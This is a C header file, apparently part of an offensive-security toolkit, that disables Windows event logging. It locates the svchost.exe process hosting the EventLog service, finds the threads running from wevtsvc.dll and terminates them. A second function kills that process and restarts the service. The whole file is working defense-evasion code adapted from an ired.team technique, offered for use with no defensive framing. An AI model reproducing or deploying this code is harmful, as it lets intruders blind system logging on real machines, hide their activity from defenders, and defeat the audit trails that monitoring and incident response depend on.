// Code hacked from: https://www.ired.team/offensive-security/defense-evasion/disabling-windows-event-logs-by-suspending-eventlog-service-threads
// Requirements: SE_DEBUG_NAME/SeDebugPrivilege enabled in token

#pragma once

#include <Windows.h>
#include <psapi.h>
#include <Tlhelp32.h>

#pragma comment(lib, "Advapi32.lib") // For SC functions

// Required for NtQueryInformationThread (Taken from PH)
// ------------------------------------------------------------------------

typedef enum _THREADINFOCLASS {
    ThreadBasicInformation, // q: THREAD_BASIC_INFORMATION
    ThreadTimes, // q: KERNEL_USER_TIMES
    ThreadPriority, // s: KPRIORITY
    ThreadBasePriority, // s: LONG
    ThreadAffinityMask, // s: KAFFINITY
    ThreadImpersonationToken, // s: HANDLE
    ThreadDescriptorTableEntry, // q: DESCRIPTOR_TABLE_ENTRY (or WOW64_DESCRIPTOR_TABLE_ENTRY)
    ThreadEnableAlignmentFaultFixup, // s: BOOLEAN
    ThreadEventPair,
    ThreadQuerySetWin32StartAddress, // q: PVOID
    ThreadZeroTlsCell, // 10
    ThreadPerformanceCount, // q: LARGE_INTEGER
    ThreadAmILastThread, // q: ULONG
    ThreadIdealProcessor, // s: ULONG
    ThreadPriorityBoost, // qs: ULONG
    ThreadSetTlsArrayAddress,
    ThreadIsIoPending, // q: ULONG
    ThreadHideFromDebugger, // s: void
    ThreadBreakOnTermination, // qs: ULONG
    ThreadSwitchLegacyState,
    ThreadIsTerminated, // q: ULONG // 20
    ThreadLastSystemCall, // q: THREAD_LAST_SYSCALL_INFORMATION
    ThreadIoPriority, // qs: IO_PRIORITY_HINT
    ThreadCycleTime, // q: THREAD_CYCLE_TIME_INFORMATION
    ThreadPagePriority, // q: ULONG
    ThreadActualBasePriority,
    ThreadTebInformation, // q: THREAD_TEB_INFORMATION (requires THREAD_GET_CONTEXT + THREAD_SET_CONTEXT)
    ThreadCSwitchMon,
    ThreadCSwitchPmu,
    ThreadWow64Context, // q: WOW64_CONTEXT
    ThreadGroupInformation, // q: GROUP_AFFINITY // 30
    ThreadUmsInformation, // q: THREAD_UMS_INFORMATION
    ThreadCounterProfiling,
    ThreadIdealProcessorEx, // q: PROCESSOR_NUMBER
    ThreadCpuAccountingInformation, // since WIN8
    ThreadSuspendCount, // since WINBLUE
    ThreadHeterogeneousCpuPolicy, // q: KHETERO_CPU_POLICY // since THRESHOLD
    ThreadContainerId, // q: GUID
    ThreadNameInformation, // qs: THREAD_NAME_INFORMATION
    ThreadSelectedCpuSets,
    ThreadSystemThreadInformation, // q: SYSTEM_THREAD_INFORMATION // 40
    ThreadActualGroupAffinity, // since THRESHOLD2
    ThreadDynamicCodePolicyInfo,
    ThreadExplicitCaseSensitivity, // qs: ULONG; s: 0 disables, otherwise enables
    ThreadWorkOnBehalfTicket,
    ThreadSubsystemInformation, // q: SUBSYSTEM_INFORMATION_TYPE // since REDSTONE2
    ThreadDbgkWerReportActive,
    ThreadAttachContainer,
    ThreadManageWritesToExecutableMemory, // MANAGE_WRITES_TO_EXECUTABLE_MEMORY // since REDSTONE3
    ThreadPowerThrottlingState, // THREAD_POWER_THROTTLING_STATE
    ThreadWorkloadClass, // THREAD_WORKLOAD_CLASS // since REDSTONE5 // 50
    MaxThreadInfoClass
} THREADINFOCLASS;

// Function prototypes
// ------------------------------------------------------------------------

typedef NTSTATUS(NTAPI* _NtQueryInformationThread)(
	IN HANDLE          ThreadHandle,
    IN THREADINFOCLASS ThreadInformationClass,
    OUT PVOID          ThreadInformation,
    IN ULONG           ThreadInformationLength,
    OUT PULONG         ReturnLength
    );

// To get all thread IDs associated with EventLog Service
// ------------------------------------------------------------------------

DWORD* get_eventlog_tids(DWORD pid, LPVOID dllBase, DWORD imageSize) {
	// Dynamically resolve a function from Ntdll
	HMODULE Ntdll = GetModuleHandleA("Ntdll.dll");
	_NtQueryInformationThread NtQueryInformationThread = (_NtQueryInformationThread)GetProcAddress(Ntdll, "NtQueryInformationThread");

	// Init some important variables
	HANDLE snapshotHandle;
	HANDLE threadHandle;
	THREADENTRY32 threadEntry;
	threadEntry.dwSize = sizeof(THREADENTRY32);
	DWORD_PTR threadStartAddress = 0;
    DWORD* threadIds = (DWORD*)malloc(sizeof(DWORD) * 6); // Older builds seem to have 5 threads while newer ones 4 threads
    DWORD threadCount = 0;

    // Enumerate all the threads inside svchost.exe
    snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	Thread32First(snapshotHandle, &threadEntry);
	while (Thread32Next(snapshotHandle, &threadEntry)) {
		if (threadEntry.th32OwnerProcessID == pid) {
			// Open a handle to the thread
			threadHandle = OpenThread(MAXIMUM_ALLOWED, FALSE, threadEntry.th32ThreadID);

			// Fetch the thread start address
			NtQueryInformationThread(threadHandle, (THREADINFOCLASS)0x9, &threadStartAddress, sizeof(DWORD_PTR), NULL);
			
			// Check if thread's start address is inside wevtsvc.dll memory range
			if (threadStartAddress >= (DWORD_PTR)dllBase && threadStartAddress <= (DWORD_PTR)dllBase + imageSize) {
				// [DEBUG]
				//printf("[+] Found wevtsvc.dll thread: %d\n", threadEntry.th32ThreadID);

				threadIds[threadCount] = threadEntry.th32ThreadID;
				threadCount++;
			}
		}
	}

	// Cleanup
	CloseHandle(snapshotHandle);
	CloseHandle(threadHandle);

	return threadIds;
}

// To kill all threads associated with EventLog Service
// ------------------------------------------------------------------------

BOOL kill_eventlog_threads() {
	// Init success flag
	BOOL flag = TRUE;

	// Open a handle to SCM
	SC_HANDLE scHandle = OpenSCManagerA(".", NULL, MAXIMUM_ALLOWED);

	// Open a handle to EventLog service
	SC_HANDLE evtLogService = OpenServiceA(scHandle, "EventLog", MAXIMUM_ALLOWED);

	// Get PID of svchost.exe that hosts EventLog service
	SERVICE_STATUS_PROCESS serviceStatusProcess = {};
	DWORD bytesNeeded = 0;
	QueryServiceStatusEx(evtLogService, SC_STATUS_PROCESS_INFO, (LPBYTE)&serviceStatusProcess, sizeof(serviceStatusProcess), &bytesNeeded);
	DWORD evtLogServicePID = serviceStatusProcess.dwProcessId;

    // [DEBUG]
	//printf("[+] Event Log Service(svchost.exe) PID: %d\n", evtLogServicePID);

	// Open a handle to the svchost.exe
	HANDLE evtLogServiceProcessHandle;
	evtLogServiceProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, evtLogServicePID);
	if (evtLogServiceProcessHandle == NULL) {
		//printf("[-] Failed to open handle to svchost.exe\n");
		//printf("%d\n", GetLastError());
		flag = FALSE;
		goto cleanup;
	}
	
	// Get a list of modules loaded by svchost.exe
	HMODULE hMods[1024];
	DWORD cbNeeded;
	DWORD modulesCount;
	DWORD ret = EnumProcessModules(evtLogServiceProcessHandle, hMods, sizeof(hMods), &cbNeeded);
	if (ret == 0) {
		//printf("[-] Failed to get modules loaded by svchost.exe\n");
		//printf("%d\n", GetLastError());
		flag = FALSE;
		goto cleanup;
	}

	// Get the module count
	modulesCount = cbNeeded / sizeof(HMODULE);

	//Init some important variables
	LPVOID evtLogServiceModuleBase;
	DWORD evtLogServiceModuleSize;
	char szBuf[50];

    // Loop through all the loaded modules
	for (unsigned int i = 0; i < modulesCount; i++) {
		// Get name of loaded module
		ret = GetModuleBaseNameA(evtLogServiceProcessHandle, hMods[i], szBuf, sizeof(szBuf));
		if (ret == 0) {
			//printf("[-] Failed to get name of module\n");
			flag = FALSE;
		    goto cleanup;
		}

        // Loop until we find wevtsvc.dll module
		if (strcmp(szBuf, "wevtsvc.dll") == 0) {
			// [DEBUG]
			//printf("[+] Found wevtsvc.dll module!\n");
			
			// Get wevtsvc.dll MODULEINFO struct
			MODULEINFO evtLogServiceModuleInfo = {};
			ret = GetModuleInformation(evtLogServiceProcessHandle, hMods[i], &evtLogServiceModuleInfo, sizeof(MODULEINFO));
			if (ret == 0) {
				//printf("[-] Failed to get MODULEINFO struct\n");
				flag = FALSE;
		        goto cleanup;
			}

	        // Retrieve wevtsvc.dll start address + image size from MODULEINFO
			evtLogServiceModuleBase = evtLogServiceModuleInfo.lpBaseOfDll;
			evtLogServiceModuleSize = evtLogServiceModuleInfo.SizeOfImage;

			break;
		}
	}

    // [DEBUG]
	//printf("[+] wevtsvc.dll start address: %X\n", evtLogServiceModuleBase);
	//printf("[+] wevtsvc.dll image size: %d\n", evtLogServiceModuleSize);

	DWORD* threadIds = get_eventlog_tids(evtLogServicePID, evtLogServiceModuleBase, evtLogServiceModuleSize);
    HANDLE threadHandle;

    // Loop through the threads and terminate them one by one
    for (unsigned int i = 0; i < 6; i++) {
    	threadHandle = OpenThread(THREAD_TERMINATE, FALSE, threadIds[i]);
    	if (threadHandle != NULL) {
    		if (!TerminateThread(threadHandle, 0)) {
    			//printf("[-] Failed to neutralize thread: %d\n", threadIds[i]);
        	    flag = FALSE;
        	    goto cleanup;
        	}

        	// [DEBUG]
        	//printf("[+] Thread killed: %d\n", threadIds[i]);
    	}
    	// Check if Event Logging is already terminated or not
    	else {
    	    if (i == 0) {
    	    	//printf("[-] EventLog Service Threads do not exist!\n");
    		    flag = FALSE;
    		    goto cleanup;
    		}
    	}
    }

    // Cleanup
    goto cleanup;

cleanup:
    CloseServiceHandle(scHandle);
    CloseServiceHandle(evtLogService);
    CloseHandle(evtLogServiceProcessHandle);
    CloseHandle(threadHandle);

	return flag;
}

// To revive EventLog Service
// ------------------------------------------------------------------------

BOOL revive_eventlog_service() {
	// Init success flag
	BOOL flag = TRUE;

	// Open a handle to SCM
	SC_HANDLE scHandle = OpenSCManagerA(".", NULL, MAXIMUM_ALLOWED);

	// Open a handle to EventLog service
	SC_HANDLE evtLogService = OpenServiceA(scHandle, "EventLog", MAXIMUM_ALLOWED);

	// Get PID of svchost.exe that hosts EventLog service
	SERVICE_STATUS_PROCESS serviceStatusProcess = {};
	DWORD bytesNeeded = 0;
	QueryServiceStatusEx(evtLogService, SC_STATUS_PROCESS_INFO, (LPBYTE)&serviceStatusProcess, sizeof(serviceStatusProcess), &bytesNeeded);
	DWORD evtLogServicePID = serviceStatusProcess.dwProcessId;

	// [DEBUG]
	//printf("[+] Event Log Service(svchost.exe) PID: %d\n", evtLogServicePID);

	// Open a handle to the svchost.exe
	HANDLE evtLogServiceProcessHandle;
	evtLogServiceProcessHandle = OpenProcess(PROCESS_TERMINATE, FALSE, evtLogServicePID);
	if (evtLogServiceProcessHandle == NULL) {
		//printf("[-] Failed to open handle to svchost.exe\n");
		//printf("%d\n", GetLastError());
		flag = FALSE;
		goto cleanup;
	}

	// Kill the svchost.exe process - this should stop the EventLog service
	if (!TerminateProcess(evtLogServiceProcessHandle, 0)) {
		//printf("[-] Failed to kill svchost.exe!\n");
		//printf("%d\n", GetLastError());
		flag = FALSE;
		goto cleanup;
	}

	// [DEBUG]
	//printf("[+] EventLog Service Process killed!\n");

	// Wait a bit before starting the service
	Sleep(6000);

	// Start the EventLog service
	if (!StartServiceA(evtLogService, 0, NULL)) {
		//printf("[-] Failed to restart EventLog Service!\n");
		//printf("%d\n", GetLastError());
		flag = FALSE;
		goto cleanup;
	}

	// [DEBUG]
	//printf("[+] EventLog Service restarted!\n");

    // Cleanup
    goto cleanup;

cleanup:
    CloseServiceHandle(scHandle);
    CloseServiceHandle(evtLogService);
    CloseHandle(evtLogServiceProcessHandle);

    return flag;
}